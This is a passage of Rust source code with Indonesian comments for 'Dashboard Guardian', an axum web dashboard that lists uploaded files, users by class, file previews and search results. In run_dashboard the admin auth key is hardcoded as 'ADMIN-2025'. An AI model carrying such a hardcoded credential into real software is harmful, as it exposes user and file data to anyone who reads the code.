    // Kembalikan status code 404 NOT FOUND beserta halaman HTML-nya
    (StatusCode::NOT_FOUND, Html(body))
}

pub async fn run_dashboard(upload_root: PathBuf, port: u16) {
    let state = Arc::new(DashboardState {
        upload_root,
        auth_key: "ADMIN-2025".to_string(),
        cache: RwLock::new(DashboardCache { snapshot: None }),
    });

    let warm_state = Arc::clone(&state);
    tokio::spawn(async move {
        let snapshot = get_snapshot(&warm_state).await;
        info!(
            files = snapshot.stats.total_files,
            users = snapshot.stats.total_users,
            "Dashboard cache warmed"
        );
    });

    let app = Router::new()
        .route("/", get(dashboard_page))
        .route("/index.html", get(dashboard_page))
        .route("/performance-utils.js", get(performance_utils_js))
        .route("/service-worker.js", get(service_worker_js))
        .route("/dashboard/api/stats", get(api_get_stats))
        .route("/dashboard/api/files", get(api_get_files))
        .route("/dashboard/api/users", get(api_get_all_users))
        .route("/dashboard/api/analytics", get(api_get_analytics))
        .route(
            "/dashboard/api/user/:class/:username",
            get(api_get_user_detail_by_class),
        )
        .route("/dashboard/api/user/:username", get(api_get_user_detail))
        .route(
            "/dashboard/api/user-files/:class/:username",
            get(api_get_user_files),
        )
        .route(
            "/dashboard/api/file-preview/:file_id",
            get(api_file_preview),
        )
        .route("/dashboard/api/correlate/:file_id", get(api_correlate))
        .route("/dashboard/api/search", get(api_search_keyword))

        // Jaring pengaman untuk route yang tidak terdaftar (404)
        .fallback(handler_404)
        .with_state(state);

    let addr = format!("0.0.0.0:{port}");
    let listener = tokio::net::TcpListener::bind(&addr).await.unwrap();
    info!("Dashboard Guardian running on http://{}", addr);
    axum::serve(listener, app).await.unwrap();
}
